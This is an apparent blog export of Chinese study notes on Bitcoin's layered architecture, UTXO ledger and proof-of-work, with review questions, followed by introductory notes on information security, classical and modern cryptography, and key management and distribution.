Verification），向全节点请求数据来验证交易，也提供P2P网络的路由功能。\n\n系统逻辑架构\n\n比特币系统的存储层主要采用文件系统和LevelDBKey-Value数据库\n\n比特币系统的数据层是系统核心功能层级之一。\n主要功能：\n\n对比特币系统核心的区块、区块链、交易、账本、地址等关键数据结构进行定义和处理\n负责将交易打包进区块，由区块组成区块链\n没有采用传统的账户&#x2F;余额模型，而是采用特殊的UTXO模型构建账本数据，并基于底层的存储服务提供对比特币区块链数据的安全读写访问管理。\n\n\n比特币系统的网络层是系统核心功能层级之一，主要采用非结构化P2P网络，基于Gossip数据分发协议\n主要功能：\n\n实现网络节点快速发现与连接，以及区块、交易数据的分发与同步\n为比特币系统各网络节点之间提供节点发现与安全连接通信机制\n为交易、区块信息在区块链网络所有节点之间提供高效传播与有效性验证机制。\n\n\n比特币系统的共识层是系统核心功能层级之一，采用PoW工作量证明共识机制\n\n\n​\t主要功能： \n\n​\t\t\t让所有的比特币网络节点都认可每次计算产生的新区块\n​\t \t并且协调保证所有比特币网络节点数据记录一致性，使比特币系统的整体状态达成一致。\n\n\n比特币系统的激励层在共识层的功能基础上，提供了总量有限的比特币发行和出块激励机制，对于加入比特币网络的节点，都能公平地通过参与PoW工作量证明竞争计算，都有一定机率被区块链系统增发奖励一定数量的比特币。\n\n比特币系统的合约层没有提供真正意义的智能合约功能，而是基于一种非图灵完备的、基于逆波兰表示法的Script脚本语言开发技术，提供交易相关锁定脚本&#x2F;解锁脚本的定制。\n\n\n\n什么是锁定脚本&#x2F;解锁脚本?\n\n\n比特币系统的接口层提供了基于JSON RPC的SDK接口和命令行接口。\n\n比特币系统的应用层基于接口层提供的SDK接口，可以基于比特币区块链实现面向电子支付等多种应用场景和业务逻辑的公有链应用\n\n\n比特币系统数据层区块与区块链   在比特币系统中，区块（Block）是区块链系统中最基本的数据单元，用于表示和记录区块链系统一段时间内发生的交易和状态结果的数据结构，是区块链系统各节点竞争完成一次共识计算的结果，多个区块采用链式结构链接在一起就构成了区块链（Blockchain）。每个区块又由区块头（Block Head）和区块体（Block Body）两部分组成。\n\n在区块链系统的所有区块中，第一个区块被称为“创世区块”。每个区块中存储了一定数量的交易数据，都由交易发起人的数字签名来保证其真实性和合法性，从第二个区块开始，每个区块都保存了前一个区块（父区块）的区块头的哈希值，区块之间首尾相互连接就构成链式结构，因而先前区块里的任何数据都不可被篡改\n\n\n账本数据在一个传统的具有支付功能的系统中，每个用户都有一个资金账户，支付系统会对每个账户的余额进行单独地记录和管理。当系统中有用户之间发生了支付的交易，系统会分别对参与交易的账户的余额信息进行检查和修改。\n（例如，甲向乙转账50元，首先需要检查甲的账户中有50元的余额，再从甲的账户中扣除50元，并向乙的账户中添加50元。可以看到，为了保证整个系统的正确性，系统需要确保对应的支付前提条件，如甲的账户中至少有50元的余额，同时也需要保证整个支付交易过程的原子性、一致性、隔离性及持久性（ACID），即保证从甲账户扣减金额和向乙账户增加相同数量的金额这两个操作必须同时执行和完成，一旦受其他事件影响中断，甲和乙的账户必须恢复到交易前的状态。）\n在比特币系统中没有直接的“账户”概念，而是用“账户地址”来代表用户的账户，相当于银行卡卡号，任何人都可以通过你的账户地址给你转账比特币。\n​    (1) 账户地址\n​    比特币的账户地址就是用户的公钥经过哈希计算及Base58编码运算后生成的160位（20字节）的字符串，账户地址计算生成流程。\n\nUTXO   (2) 账本数据模型\n​    比特币系统账本没有采用传统的“账户&#x2F;余额”模型，而是提出了一种独特的UTXO（Unspent Transaction Output）未消费的交易输出模型，简称比特币UTXO模型。UTXO是一个包含交易数据和对应的执行代码的数据结构，所有的UTXO条目构成了比特币系统的“账本”。\n​    UTXO模型的本质是通过交易记录来构成系统账本，而不是通过账户信息构成账本。在比特币的每一笔支付交易中，都有“交易输入”（标识资金来源）和“交易输出”（标识资金去向），且每个交易都可以有多个交易输入和多个交易输出，交易之间按照时间戳的先后顺序排列，且任何一个交易中的交易输入都是其前序的某个交易中产生的“交易输出”，而所有交易的最初的交易输入都来自比特币系统节点生成区块得到的激励（比特币）。\n比特币系统中的每个“账户”可以视为对应着某个地址，比特币区块链不会直接跟踪每个地址的比特币余额，而是在区块链中存储交易数据的整个历史，比特币系统通过“交易池”跟踪区块链网络中所有UTXO的集合，而某个地址在某个时间点所具有的“余额”，是通过检查、求和与该地址相关的所有UTXO来计算。当使用UTXO时，它将从交易池中被删除，这将实时在计算余额时反映出来。\n交易数据结构​    在比特币的每一笔交易数据中，都包含一个或多个“交易输入”（标识资金来源）、一个或多个“交易输出”（标识资金去向）、交易时间戳等信息。\n\n交易输入数据结构交易输出数据结构状态数据在比特币系统中，交易表示一次价值转移操作，会导致账本状态的一次改变，如增加了一条交易记录；区块表示记录一段时间内发生的交易和状态结果，是对当前账本状态的一次共识和确认；链是由一个个区块按照发生时间顺序串联而成，可以看作是整个区块链状态变化的日志记录。\n在一个比特币区块的区块头中包含了Merkle树根的哈希值，在区块体中包含了所有经过验证的交易数据。区块体中所有交易数据的哈希值构成了一棵Merkle树，每个叶子节点是每个交易信息的哈希值，将该Merkle树的根节点的值，称根哈希（Root Hash）或主哈希（Master Hash），存入区块头。\n比特币系统网络层P2P网络结构比特币系统采用的P2P网络属于非结构化P2P网络，不存在中心服务器，比特币网络中存在“全节点”、“轻节点”等不同类型的节点，不同类型的节点在网络中扮演的角色也有所不同，其中发挥核心作用的是全节点。\n全节点全节点要一直在线，是比特币P2P网络中功能最完整的节点，全节点要竞争计算新区块的出块权，会存储完整的区块链数据，要监听比特币网络上的交易信息，验证每个交易的合法性，并提供P2P网络的路由功能。\n轻节点​    轻节点不需要一直在线，不参与出块权的竞争计算，不会存储完整的区块链，只需要保存每个区块的区块头信息，以及与自己相关的交易信息，可以发起简单支付验证请求SPV，向全节点请求数据来验证交易，并提供P2P网络的路由功能。轻节点除了主要提供交易功能外，还常常提供钱包功能。\n​    比特币系统的P2P网络基于TCP构建，默认RPC通信服务端口是8332，默认数据同步端口是8333，比特币系统的P2P网络主要采用了Gossip协议来实现节点发现、节点连接、区块广播、交易广播等功能。\n节点发现管理交易广播在比特币系统中，节点为了向比特币系统发送一笔交易，需要向邻近的对等全节点发送Inv消息。如果接收到对等节点返回的GetData消息，节点再使用Tx消息向对等节点发送交易信息。对等节点接收到交易信息后，将以同样的方式向其它邻近节点转发交易信息。\n\n交易池比特币网络中每个节点都会维护一个未确认交易列表，称为“交易池”。节点使用交易池记录并跟踪等待被区块链系统确认的交易。例如，具有钱包功能的节点会使用交易池来记录那些已发送到网络但还未被确认的，只与该节点上的钱包相关的预支付交易信息。\n某些节点还维护一个单独的“孤立交易池”。所谓“孤立交易”是指，如果一个交易的输入与某未知的交易有关，如与缺失的父交易相关，该孤立交易就会被暂时存储在孤立交易池中直到父交易的信息到达。当一个交易被添加到交易池时，会同时检查孤立交易池，看是否有某个孤立交易引用了此交易的输出（子交易）。任何匹配的孤立交易会被进行验证。如果验证有效，它们会从孤立交易池中删除，并添加到交易池中。\n区块广播与同步比特币系统共识层PoW工作量证明共识机制比特币系统通过共识机制竞争计算生成新区块的过程，被称为“挖矿（Mine)”，因此比特币网络节点又被称为“矿工（Miner）”，后续如以太坊等其它区块链系统都延用了这种说法。\n\nPoW共识机制的特点比特币系统的PoW共识机制具有两大特点：\n(1) 比特币系统PoW共识机制采用的“难题”具有难以解答，但很容易验证答案的正确性的特点，同时求解难题的“难度”，即比特币网络节点平均解出一个难题所消耗时间，是可以通过调整难题中的部分参数来进行控制的，因此比特币系统可以很好地控制链增长的速度；\n(2) 通过控制区块链的增长速度，保证了如果一个节点成功解出难题完成了新区块的创建，该区块能够以更快的速度在所有节点之间传播，并且得到其他节点的验证，再结合比特币系统所采取的“最长链有效”的评判机制，就能够在大多数（超过比特币网络51%算力）节点都是诚实的情况下，避免恶意节点对区块链的控制。\n竞争出块冲突比特币系统激励层激励机制在比特币系统中，比特币网络约每10分钟生成一个不超过1MB大小的区块，用于记录这10分钟内发生的验证过的交易内容，并将区块串联到最长的链尾部，每个区块的成功提交者可以得到系统一定数量的比特币的奖励（该奖励将作为区块内的第一个CoinBase交易，并将在一定区块数后才能使用），以及用户附加到交易上的支付服务费用。因此，即使没有任何用户交易，比特币网络也可以自行产生合法的区块并生成奖励。每个区块的奖励最初是50个比特币，每隔21万个区块（约4年时间）自动减半，最终比特币总量稳定在2100万个\n比特币系统的激励机制主要包括以下要点：\n(1)加密货币总量固定：比特币总量不超过 2100 万个。\n(2)出块激励：每当有节点获得一个区块的记账权，比特币系统就会发行出新的比特币作为对节点的奖励。一个区块产生的比特币数量都会按几何级数递减，每产出 21 万个区块，获得奖励的比特币数量就会减少 50% 。截至2022年，每个区块的奖励已降低为6.25个比特币，是比特币系统上线时的八分之一。\n(3)交易激励：用户会在交易中包含交易费，作为处理交易的服务费支付给获得区块记账权的节点。\n比特币系统合约层比特币系统的交易脚本比特币系统没有账户机制，而采用了一种比较特别的 UTXO交易模型，类似于财务会计记账方法，每一笔交易数据主要包括两部分：交易输入记录和交易输出记录。\n   （1）交易输出记录中除了包含输出比特币金额外，还包含了称为“锁定脚本”的一段脚本代码。\n   （2）交易输入记录中除了包含对前一个交易输出部分的引用外，还包含了称为“解锁脚本”的一段脚本代码。\n交易脚本执行机制图灵完备性\n逆波兰表示法\n交易标准脚本（一）填空题\n1. 在比特币系统中，每个区块又由      和      两部分组成。\n2.    年  月，随着比特币区块链系统生成了第一个区块，标志着世界上第一个区块链系统的诞生。\n3. 比特币的标准单位是      ，最小单位是      ，1个标准单位的比特币等于       个最小单位的比特币。\n4. 比特币系统的发行量每四年减半，总量上限为    万枚，并且无法被超发。\n5. 比特币网络中存在     、     等不同类型的节点，不同类型的节点在网络中扮演的角色也有所不同。\n6. 比特币系统每个区块的区块体所包含的交易记录列表，实际上就是可以用于唯一标识与检索指定交易的交易哈希值列表，区块头中将存储由所有交易哈希值构造的     树的根哈希值。\n（二）选择题\n1. 在区块链系统的所有区块中，第一个区块被称为（   ）。\nA. 初始区块    B. 创世区块      C. 元区块      D. 头区块\n2. 在比特币系统区块链的每个区块的区块头中会保存多个哈希值，但没有保存（   ）。\nA. 当前区块整体的哈希值         B. 当前区块的区块头的哈希\nC. 前一个区块的区块头的哈希值      D. 下一个区块的区块头的哈希值\n3. 比特币系统采用（   ）模型，通过交易记录来构成系统账本。\nA. UTXO      B. 账户       C. 数据库       D. 会计\n4. 比特币的账户地址就是（   ）经过一系列哈希计算及Base58编码运算后生成的160位（20字节）的字符串。\nA. 用户私钥    B. 用户公钥     C. 随机数       D. 节点IP地址\n5. 在比特币系统中，每一笔交易数据中不包含的是（    ）。\nA. 交易输入    B. 交易输出     C. 交易哈希      D. 交易金额\n（三）简答题（任选3道）\n1. 请简述比特币系统的区块链中各个区块是怎么链接的？\n2. 请简述比特币系统的“账户地址”是怎样计算生成的？\n3. 请简单分析比特币系统PoW共识机制节点竞争计算生成新区块的过程？\n4. 请简述比特币系统的出块激励规则？\n5. 请简述比特币系统如何处理竞争出块冲突和孤块\n6.什么是比特币区块链系统的Layer2技术，请分析一个典型的比特币Layer2项目？\n","url":"2024/12/08/链原——比特币系统/","date":"2024-12-08"},{"title":"区块链安全基础一","content":"关键词：信息安全  网络安全  （非）对称加密   密钥管理技术一. 信息安全知识基础1.1 信息安全定义&amp;特征1.1.1信息安全的定义：​\ta. 信息系统的安全（也称实体安全，系统运行的安全）\n​\tb. 特定信息体系的安全\n\n系统中信息的安全（用户权限的限制，数据加密）\n管理安全（对信息资源和系统运行的管理）\n\n1.1.2信息安全的特征a. 保密性\nb. 完整性\nc. 可用性\nd. 可控性\ne. 可审查性\n关于五种特征的解释：（1）保密性：保密性是指信息不泄漏给非授权的个人、实体和过程，或供其使用的特性。（2）完整性：完整性是指信息未经授权不能被修改、不被破坏、不被插入、不延迟、不乱序和不丢失的特性。对网络信息安全进行攻击其最终目的就是破坏信息的完整性。（3） 可用性：可用性是指合法用户访问并能按要求顺序使用信息的特性，即保证合法用户在需要时可以访问到信息及相关资产。（4）可控性：可控性是指授权机构对信息的内容及传播具有控制能力的特性，可以控制授权范围内的信息流向以及方式。（5）可审查性（抗抵赖性）：在信息交流过程结束后，通信双方不能抵赖曾经做出的行为，也不能否认曾经接收到对方的信息。\n1.2 网络安全的定义&amp;特征1.2.1 网安定义a. 硬件安全\nb. 软件安全\nc.系统中数据的安全\n1.2.2网安特征a.保密性\nb.完整性\nc.可用性\nd.可控性\n1.3 网络信息安全技术需求1.3.1 网络物理安全（实体安全）​\t指所有支持网络系统运行的硬件总体安全。\n​\t物理安全的需求主要有：\n\n环境安全\n设备安全（物理防备）\n媒体安全（媒体数据&amp;媒体本身）\n\n1.3.2网络认证​\t定义：实现网络资源访问控制的前提和依据。\n​\t作用：标识，鉴别网络资源访问者身份的真实性\n1.3.3 网络访问控制​\t网络访问控制是有效保护网络管理对象，使其免受关键技术方法。其目标主要有两个：​\t（1）限制非法用户获取或使用网络资源。​\t（2） 防止合法用户滥用权限，越权访问网络资源。\n1.3.4网络安全保密​\t目的： 就是防止非授权的用户访问网上信息或网络设备。\n​\t为此，重要的网络物理实体能够采用辐射干扰机技术，防止通过电磁辐射泄露机密信息。\n1.3.5网络安全监测​\t作用： 发现系统入侵活动和检查安全保护措施的有效性，以便及时报警给网安管理员\n1.3.6网络漏洞评估​\t作用： 扫描弱点&amp;漏洞\n1.3.7 防范网络恶意代码1.3.8 网络安全应急响应1.3.9 网络安全体系​\t网络安全的实现不仅仅取决于某项技术，而是依赖于一个网络信息安全体系的建立，这个体系包括安全组织机构、安全制度、安全管理流程、安全人员意识等。通过安全体系的建立，可以在最大程度上实现网络的整体安全，满足企业或单位安全发展的要求。\n1.4 信息安全策略\n物理安全\n访问控制\n防火墙\n信息加密\n网络安全管理\n\n1.5 相关法律二. 密码学基础2.1 密码基本知识\n2.2 古典密码体制2.2.1 单表密码（仅个人兴趣列出 非必须掌握）\n\n凯撒密码\n\n该算法表示为： \n\n（c代表密文，p代表明文）\n\n仿射密码\n仿射密码的主要特点是使用一个线性函数进行加密和解密。\n加密过程：\n在仿射密码中，字符通过以下公式进行加密：\nE(x)&#x3D;(ax+b) mod  m \n\nE(x)：加密后的字符\n\nx：原字符在字母表中的位置（例如，A&#x3D;0，B&#x3D;1，C&#x3D;2，…，Z&#x3D;25）\n\na 和 b：密钥，其中 a必须与字母表的大小 m 互质\n\nm：字母表的大小（例如，对于英文字母，m&#x3D;26）\n\n\n假设我们选择 a&#x3D;5 和 b&#x3D;8，加密字母 “C”：\n\nC 的位置 x&#x3D;2\n\n加密：E(2)&#x3D;(5⋅2+8)mod  26&#x3D;18\n\n对应字母为 “S”\n\n\n\n乘法密码\n加密公式为：\nE(x)&#x3D;(a⋅x)mod  m\n\nE(x)：加密后的字符\nx：原字符在字母表中的位置（例如，A&#x3D;0，B&#x3D;1，C&#x3D;2，…，Z&#x3D;25）\na：密钥，且必须与字母表的大小 m 互质\nm：字母表的大小（对于英文字母，m&#x3D;26）\n\n\n密钥词组密码\n\n\n加密过程\n选择密钥词组：首先选择一个密钥词组，去掉重复字母并将字母的顺序保留。例如，如果选择的密钥词组是 “SECURITY”，则变为 “SECURIT”（去掉重复的 “I”）。\n\n生成替代字母表：使用密钥词组的字母开头，后面跟上字母表中未在密钥词组中的字母。\n密钥字母：S E C U R I T\n\n剩余字母：A B D F G H J K L M N O P Q V W X Y Z\n\n生成的替代字母表：\n1S E C U R I T A B D F G H J K L M N O P Q V W X Y Z\n\n\n加密文本：用原字母表的字母替换为替代字母表中的字母。\n\n\n2.2.2 多表密码2.2.2.1普拉斐尔密码\n加密过程\n选择密钥：选择一个密钥词（例如 “PLAYFAIR”），去掉重复字母并将其填入一个5x5的矩阵中。\n\n填充矩阵：在密钥的基础上，依次填入剩余字母（通常将 “I” 和 “J” 合并为一个字母，矩阵中只使用一个）。\n例如，使用 “PLAYFAIR” 作为密钥，矩阵为：\n12345P L A Y FI R B C DE G H K MN O Q S TU V W X Z\n\n准备明文：将明文按两两分组。如果有重复的字母，插入一个填充字母（通常使用 “X”）。如果最后一组只有一个字母，则在其后添加一个填充字母。\n例如，明文 “HELLO” 变为 “HE LL OX”（分组为 “HE”, “LX”, “OX”）。\n\n加密规则：\n\n同列：如果两个字母在同一列中，则用其下方的字母替换（循环回到顶部）。\n同行：如果两个字母在同一行中，则用其右边的字母替换（循环回到左边）。\n不同行不列：如果两个字母在矩阵的不同位置，形成一个矩形，则用矩形的对角字母替换。\n\n例如，加密 “HE”：\n\nH(第3行第3列) 和 E(第3行第1列) 形成一个矩形，加密为 “BK”。\n\n\n重复上述步骤：对所有分组进行加密。\n解密过程解密过程与加密过程相反，使用相同的矩阵和规则：\n\n同列：用上方的字母替换。\n同行：用左边的字母替换。\n不同行不列：用矩形的对角字母替换。\n\n\n\n2.2.2.2 维吉尼亚密码\n加密过程\n选择关键词：选择一个关键词（例如 “KEY”），并将其重复直到与明文长度相同。\n\n明文和关键词对齐：将明文与关键词字符逐一对齐。\n例如，明文为 “HELLO WORLD”，关键词为 “KEY”，对齐后：\n12H E L L O   W O R L DK E Y K E   K E Y K E\n\n\n\n\n解密过程解密过程与加密过程相似，但公式反转：\n\n示例假设明文为 “HELLO WORLD”，关键词为 “KEY”：\n\n重复关键词：将 “KEY” 重复，得到 “KEYKEYKEYK”。\n对齐并加密：\nH (7) + K (10) &#x3D; R (17)\nE (4) + E (4) &#x3D; I (8)\nL (11) + Y (24) &#x3D; J (9)\nL (11) + K (10) &#x3D; V (21)\nO (14) + E (4) &#x3D; S (18)\n空格不加密\nW (22) + K (10) &#x3D; G (6)\nO (14) + E (4) &#x3D; S (18)\nR (17) + Y (24) &#x3D; P (15)\nL (11) + K (10) &#x3D; V (21)\nD (3) + E (4) &#x3D; H (7)\n\n\n\n最终加密结果为 “RIJVS GSPVH”。\n2.2.2.3 希尔密码\n\n2.3 现代密码体制2.3.1 对称密码体制加密解密用同一把密钥 or 两把密钥之间可以推理出来\n对称加密算法的优点：\n\n加，解密处理速度快\n保密度高\n\n对称加密算法的缺点：\n\n密钥分发困难\n密钥管理困难\n\n举例：\n数据加密标准(DES)算法：\n\n\nDES算法特点：（1）分组加密算法：以64位为分组，64位一组明文输入，64位密文输出。（2） 对称算法：加密和解密用同一密钥。（3）有效密钥长度为56位：密钥通常表示为64位数，但每个第8位都用作奇偶校验，可以忽略。（4）代替和置换：DES算法是两种加密技术的组合，先代替后置换。（5） 易于实现：DES算法只是使用了标准的算术和逻辑运算，其作用的数最多也只有64位，并且，算法的重复特性使得它可以非常理想地在一个专用芯片中实现\n2.3.2 非对称密码体制\n加密解密用不同密钥 or 两把密钥之间很难推理出来\n非对称加密算法的优点：\n 1. &lt;span style = &quot;color: red;&quot;&gt;密钥分发简单&lt;/span&gt;\n 2. &lt;span style = &quot;color: red;&quot;&gt;密钥管理便捷&lt;/span&gt;\n 3. &lt;span style = &quot;color: red;&quot;&gt;可以实现签名&lt;/span&gt;\n\n非对称加密算法的缺点：\n\n加密解密处理速度较慢\n同等安全强度下公钥密码体制的密钥位数要求多一些\n\n举例：\n\nRSA密钥生成原理\nEIGamal公钥密码技术\n椭圆曲线密码技术\n\n[具体解释等如果到时候我再遇到就去查了补充在这里QwQ]\n三.密钥管理技术\n一个完整的保密通信系统\n由\n\n密码体制（密码算法，及所有的明文，密文和密钥）\n\n信源\n\n信宿\n\n攻击者\n\n\n构成。\n  加解密算法一般都是公开的，所有的密码技术都依赖于密钥。当密码算法确定后，密码系统的保密程度就完全取决于密钥的保密程度。\n密钥管理定义\n密钥管理涉及密钥的产生和存储、分发、使用、更新（替换）、备份和恢复、以及撤销和销毁等，涵盖了密钥的整个生存周期。\n密钥管理目的\n确保密钥的安全性\n确保密钥的有效性\n密钥的分发和分享\n密钥的更新和轮换\n密钥的备份和恢复\n监控和审计\n\n3.1 密钥的类型和组织结构3.1.1 关于密钥长度​\t密钥是安全通信的必要长度之一\n长度决定因素：\n\n数据价值\n所需安全期\n攻击者资源情况\n计算机计算能力\n加密算法的发展\n\n3.1.2密钥的产生与存储产生与生成算法有关：大部分采用随机或伪随机过程\n存储：有无介质，记录介质，物理介质等几种\n3.1.3密钥的使用&amp;更新（替换）密钥的使用是指从存储介质上获得密钥，进行加密和解密的技术活动。\n密钥的更新和替换是指定期更换密钥，以增强系统的安全性和保护密钥的长期有效性\n3.1.4密钥的备份与恢复备份：在密钥使用期内，存储一个受保护的拷贝，用于恢复遭到破坏的密钥\n恢复：当一个密钥由于某种原因被破坏了，在还没有泄露出去以前，从它的一个备份重新得到密钥的过程 \n3.1.5密钥的销毁和撤销销毁：一般针对公钥证书所对应的密钥，撤销后密钥不再具备使用效力。\n自然撤销：当证书到期时\n按需撤销\n密钥更换后，原来的密钥必须销毁。密钥不再使用时，该密钥所有的拷贝都必须删除，生成或构造该密钥的所有信息也应该被全部删除。\n3.2 密钥托管技术定义：提供一种密钥备份与恢复的途径，也称为托管加密\n实现手段：把加密的数据和数据恢复密钥联系起来，通过一个防窜扰的托管加密芯片（Clipper芯片）来实现，该技术包括两个主要的核心内容：\n\nskipjack加密算法\nLEAF\n\n密钥托管技术在具体实施时有三个主要环节：生产托管Clipper芯片、用芯片加密通信、无密钥存取\n技术组成：USC  KEC  DRC\n（这几个模块的相互关系：这几个模块的相互 关系：USC用密钥K加密明文，并且在传送的同时传送一个数据 恢复域DRF（Data Recovery Field）， DRC则从KEC提供的和DRF 中包含的信息中恢复出密钥K来解密密文。）\n\n1.USC：(1)USC: USC由软件、硬件组成(一般情况下，硬件比 软件安全、不易发生窜扰)，提供数据加密&#x2F;解密的能力，执 行支持数据恢复的操作，同时也支持密钥托管。这种支持体 现在将数据恢复域(DRF)附加到数据上。\nUSC的功能表现在以下几个方面:1 提供具有数据加解密能力的算法及支持密钥托管功能的硬 件或相关软件。2 提供通信(包括电话、电子邮件及其他类型的通信，由相 关部⻔在法律许可的条件下对通信的监听后执行对突发事件 的解密)和数据存储的密钥托管。3 提供突发解密的识别符(包括用户或USC的识别符、密钥 的识别符、KEC或托管代理机构的识别符)和密钥(包括属 于芯片单元密钥KEC所使用的全局系统密钥，密钥还可以是 公钥或私钥，私钥的备份以托管的方式有托管机构托管)。\n2.KEC：(2)KEC:可以作为公钥证书密钥管理系统的组成部分，也 可以作为通用密钥管理的基础部分。它由密钥管理机构控制， 主要用于向DRC提供所需的数据和服务，管理着数据恢复密钥 的存储、传送和使用。数据恢复密钥主要用于生成数据加密密 钥，因此在使用托管密码加密时，所有的托管加密数据都应与 被托管的数据恢复密钥联系起来。\n数据恢复密钥主要由以下内容组成:\n\n密钥选项\n\n密钥分割\n\n密钥的产生和分配\n\n密钥托管时间\n\n密钥更新\n\n密钥的全部和部分\n\n密钥存储\n\n\nKEC在向DRC提供诸如托管的密钥等服务时，服务包括:1 授权过程:对操作或使用DRC的用户进行身份认证和对访问 加密数据的授权证明。2 传送数据恢复密钥(主密钥不提供):如果数据恢复密钥是 会话密钥或产品密钥，KEC向DRC直接传送数据恢复密钥。密 钥传送时和有效期一起传送，有效期过后，密钥将被自动销 毁。3 传送派生密钥:KEC向DRC提供由数据恢复密钥导出的另一 密钥(派生密钥)。比如受时间限制的密钥，被加密的数据仅 能在一个特定的有效时间段内被解密。4 解密密钥:如果在DRF中使用主密钥加密数据加密密钥 时，KEC只向DRC发送解密密钥，而不发送主密钥。5 执行⻔限解密:每个托管机构向DRC提供自己的解密结 果，由DRC合成这些结果并得到明文。 6数据传输:KEC和DRC之间的数据传输可以是人工的也 可以是电子的。\n3.DRC(3)DRC:由算法、协议和设备组成。DRC利用KEC所提 供的和在DRF中包含的信息中恢复出数据加密密钥，进而解 密密文，得到明文。仅仅在执行指定的已授权的数据恢复时 使用。为了解密数据，要获得数据加密密钥， DRC必须采用下列方 法来获得数据加密密钥:(1)从发送方S或接收方R接入:(2)与KEC交互(3)穷举搜索\n(1)从发送方S或接收方R接入:\n首先要确定与S或R相关的数据恢复密钥能否恢复密钥K。如果只 能利用S的托管机构持有的子密钥才能获得K，当各个用户分别向专 ⻔的用户传送消息，尤其是在多个用户散布在不同的国家或使用不 同的托管机构时，DRC一定得获取密钥托管数据后才能进行实时解 密，这是有困难的;同样，当只有利用R的托管机构所持的子密钥才 能获得K时，也不可能实时解密专⻔用户传送出的消息。如果利用托 管机构的子集所持的密钥可以进行数据恢复，那么一旦获得了K，则 DRC就可以实时解密从USC发出或送入的消息。该系统就可以为双 向实时通信提供这种能力，但这要求通信双方使用相同的K。\n(2)与KEC交互 \n对于每个数据加密密钥，S或R都有可能要求DRC或KEC有一次相互作用，其中对数据加密密钥要求DRC与KEC之间的联系是 在线的，以支持当每次会话密钥改变时的实时解密。\n(3)穷举搜索 \n当托管代理机构把部分密钥返回给DRC时，DRC必须使用穷举搜索以确定密钥的其余部分。DRC还使用技术、操作和法律等保护手段来控制什么是可以解 密的，比如可以对数据恢复进行严格的时间限制。这些保护措施提 供了KEC传送密钥时所要求的限制，而且认证机构也可以防止DRC 用密钥产生伪消息。\n3.3 密钥分配方案3.3.1分配依据\n减轻负担，提高效率——（自动密钥分配机制）\n\n提高安全性——减少系统中驻留的密钥量\n\n\n3.3.2常用密钥分配技术\n静态分配技术\n静态分配技术是一种由中心以离线方式预分配的技术，是“面对面”的分发，如到银行领取信用卡密钥，它具有安全性 好的特点，是长期沿用的传统密钥管理技术，不过，它必须 解决密钥的存储技术，静态分发只能以集中式机制存在。\n\n动态分配技术动态分配技术是一种“请求一分发”的在线分发技术，如在网上申请用户密钥，它具有方便、及时的特点，但这种分配 技术需要有专门的协议的支持，动态分配技术可采用有中心 或无中心的机制。\n\n\n3.3.3 密钥分配体制集中式密钥分配体制集中式分配体制是引入一个中心服务器（通常称作密钥分配中心或KDC），在这个体系中，团体中的任何一个实体与中心服务 器共享一个密钥。在这样的系统中，需要存储的密钥数量和团体 的人数量差不多，KDC接受用户的请求，为用户提供安全的密钥 分配服务。它的典型代表是Kerboros协议。\n分布式密钥分配体制分布式分配体制中网络中的主机具有相同的地位，他们之间的 密钥分配取决于他们之间的协商，比较著名的有Diffie-Hellman密 钥交换协议，但Diffie-Hellman密钥交换协议没有提供鉴别机制，不能抵抗中间人攻击。\n3.3.4密钥分配的基本方法对于通信双方A和B，密钥分配可以有以下几种方法：1 密钥由A选定，然后通过物理方法安全地传递给B。2 密钥由可信赖的第三方C选取并通过物理方法安全地发送给A 和B。3 如果A和B事先已有一密钥，那么其中一方选取新密钥后，用已有的密钥加密新密钥发送给另一方。4 如果A和B都有一个到可信赖的第三方C的保密信道，那么C就可以为A和B选取密钥后安全地发送给A和B。5 如果A和B都在可信赖的第三方C发布自己的公开密钥，那么 他们用彼此的公开密钥进行保密通信。\n3.3.5对称密码技术的密钥分配方案ANSI X9.17定义了三层密钥层次结构：1）主密钥（KKMs），通过手工分配；\n2）密钥加密密钥（KKs），通过在线分配；\n3）数据密钥（KDs）。\n对称密码技术的密钥分配方案：（1）集中式密钥分配方案\n\n（2）分布式密钥分配方案\n  分布式密钥分配方案是指网络通信中各个通信方具有相同的地位，它们之间的密钥分配取决于它们之间的协商，不受何其 他方的限制。这种密钥分配方案要求有n个通信方的网络需要 保存[n(n-1)&#x2F;2]个主密钥，对于较大型的网络，这种方案是不适用的，但是在一个小型网络或一个大型网络的局部范围内，这种方案还是有用的。\n\n3.3.6非对称密码技术的密钥分配方案(1)公钥的分配：\n分开发布\n 公开发布:是指用户将自己的公钥发送给另外一个参与 者，或者把公钥广播给相关人群。\n这种方法有一个非常大的缺 点:任何人都可以伪造一个公钥冒充他人。\n\n公用目录 由一个可信任的系统或组织建立和管理维护公用目录，该公用目录维持一个公开动态目录。公用目录为每个参与者维护一 个目录项{标识符，公钥}，每个目录项的信息必须进行安全认 证。任何人都可以从这里获得需要保密通信的公钥。与公开发布公钥相比，这种方法的安全性高一些。\n但也有一个致命的弱点， 如果攻击者成功地得到目录管理机构的私钥，就可以伪造公钥， 并发送给给其他人达到欺骗的目的\n\n公钥机构\n\n\n​\t 为更严格控制公钥从目录分配出去的公钥更加安全，为此需 要引入一个公钥管理机构来为各个用户建立、维护和控制动态的公用目录。与单纯的公用目录相比，该方法的安全性更高。但这 种方式也有它的缺点:由于每个用户要想和其他人通信都需求助 于公钥管理机构，因而管理机构可能会成为系统的瓶颈，而且由 管理机构维护的公用目录也容易被攻击者攻击。\n\n公钥证书\n\n  在不与公钥管理机构通信，又能证明其他通信方的公钥的可信度，实际上完全解决了公开发布及公用目录的安全问题。\n采 用公钥证书是为了解决公开密钥管理机构的瓶颈问题。公钥证书即数字证书是由授权中心CA(Certificate Authority)颁发的。\n证书的形式为CA&#x3D;ESKCA[T，IDA， PKA]，其中IDA是用户A的身份标识符，PKA是A的公钥，T是 当前时间戳，SKCA是CA的私钥。\nps:公钥证书的发放过程：\n\n(2)利用非对称密码技术进行对称密码技术密钥的分配:\n简单分配:\n\n下图就是用 非对称密码技术建立会话密钥 的过程。\n\n但这一分配方案容易 遭到主动攻击，假如攻击者已 经接入A和B双方的通信信 道，可以轻易地截获A、B双 